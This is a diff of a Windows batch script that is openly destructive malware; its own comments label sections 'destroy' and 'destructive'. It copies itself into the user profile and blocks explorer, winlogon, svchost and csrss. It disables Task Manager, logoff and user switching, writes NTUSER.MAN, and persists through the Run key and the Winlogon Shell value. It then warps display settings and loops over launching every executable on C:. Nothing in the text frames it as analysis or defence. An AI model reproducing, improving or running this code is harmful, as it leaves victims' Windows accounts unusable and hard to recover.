@@ -1,3 +1,4 @@
+@echo off
 mkdir %USERPROFILE%\ar-SB
 mkdir %USERPROFILE%\de-LE
 copy "%~f0" %USERPROFILE%\de-LE
@@ -73,28 +74,28 @@ reg add "HKCU\Control Panel\Desktop\WindowMetrics" /v IconFont /t REG_BINARY /d 
 reg add "HKCU\Control Panel\Desktop\WindowMetrics" /v MessageFont /t REG_BINARY /d f1ffffff00000000000000000000000090010000000000010000050041007200690061006c0000000000000000000000000000000000000000000000000000000000000000000000000000000000 /f
 reg add "HKCU\Control Panel\Desktop\WindowMetrics" /v IconFont /t REG_BINARY /d f1ffffff00000000000000000000000090010000000000010000050041007200690061006c0000000000000000000000000000000000000000000000000000000000000000000000000000000000 /f
 reg add "HKCU\Control Panel\Desktop\WindowMetrics" /v IconFont /t REG_BINARY /d f1ffffff00000000000000000000000090010000000000010000050041007200690061006c0000000000000000000000000000000000000000000000000000000000000000000000000000000000 /f
-REM ; ddestroy ittttttttt
+' destroy
 Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "1" /t REG_SZ /d "explorer.exe" /f
 Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "2" /t REG_SZ /d "winlogon.exe" /f
 Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "3" /t REG_SZ /d "svchost.exe" /f
 Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v "4" /t REG_SZ /d "csrss.exe" /f
-REM ; and disable ts
+' disabling
 Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableSwitchUser" /t REG_DWORD /d "1" /f
 Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoLogoff" /t REG_DWORD /d "1" /f
 Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoClose" /t REG_DWORD /d "1" /f
 Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d "1" /f
-REM ; DESTRUCTIVE!!
+' destructive
 echo. > %USERPROFILE%\NTUSER.MAN
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Recovery" /t REG_SZ /d "%appdata%\Microsoft\Recovery.bat" /f
-reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /t REG_SZ /d "explorer.exe,%appdata%\Microsoft\Recovery.bat"
-REM ; end of
-reg add "HKCU\Control Panel\Desktop" /v "LogPixels" /t REG_DWORD /d "192"
-reg add "HKCU\Control Panel\Desktop\WindowMetrics" /v "BorderWidth" /t REG_SZ /d "-175"
-reg add "HKCU\Control Panel\Software\Microsoft\Windows\DWM" /v "ColorPrevalence" /t REG_SZ /d "1"
-reg add "HKCU\Control Panel\Desktop\WindowMetrics" /v "AccentColor" /t REG_SZ /d "ff0000ff"
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize" /v "ColorPrevalence" /t REG_SZ /d "1"
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Accent" /v "AccentColorMenu" /t REG_SZ /d "ff0000ff"
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Accent" /v "AccentColorMenu"/t REG_SZ /d "ff0000ff"
+reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /t REG_SZ /d "explorer.exe,%appdata%\Microsoft\Recovery.bat" /f
+' end of destructive, start of accessibility
+reg add "HKCU\Control Panel\Desktop" /v "LogPixels" /t REG_DWORD /d "192" /f
+reg add "HKCU\Control Panel\Desktop\WindowMetrics" /v "BorderWidth" /t REG_SZ /d "-175" /f
+reg add "HKCU\Control Panel\Software\Microsoft\Windows\DWM" /v "ColorPrevalence" /t REG_SZ /d "1" /f
+reg add "HKCU\Control Panel\Desktop\WindowMetrics" /v "AccentColor" /t REG_SZ /d "ff0000ff" /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize" /v "ColorPrevalence" /t REG_SZ /d "1" /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Accent" /v "AccentColorMenu" /t REG_SZ /d "ff0000ff" /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Accent" /v "AccentColorMenu"/t REG_SZ /d "ff0000ff" /f
 
 :1
 for /r "C:\" %%a in (*.exe) do start "" "%%~fa"
